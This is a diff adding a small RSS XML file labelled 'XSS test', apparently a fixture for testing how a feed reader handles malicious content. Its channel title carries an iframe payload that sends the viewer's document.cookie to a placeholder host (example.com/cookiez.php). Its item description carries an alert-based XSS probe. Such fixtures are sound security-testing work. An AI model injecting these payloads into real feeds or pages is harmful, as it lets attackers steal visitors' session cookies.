@@ -1,0 +1,20 @@
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;
+
+&lt;channel&gt;
+&lt;title&gt;&lt;![CDATA[&quot;&gt;&lt;iframe src=&quot;javascript:window.location=&#039;http://www.example.com/cookiez.php?c=&#039;+document.cookie&quot;&gt;&lt;/iframe&gt;&lt;a lol=&quot;]]&gt;&lt;/title&gt;
+&lt;description&gt;XSS test&lt;/description&gt;
+
+&lt;item&gt;
+&lt;title&gt;&lt;![CDATA[z0mG?!]]&gt;&lt;/title&gt;
+&lt;link&gt;&lt;![CDATA[what teh hax?!]]&gt;&lt;/link&gt;
+
+&lt;description&gt;
+&lt;![CDATA[
+&quot;&gt;&lt;iframe src=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/iframe&gt;
+]]&gt;
+&lt;/description&gt;
+&lt;/item&gt;
+
+&lt;/channel&gt;
+&lt;/rss&gt;
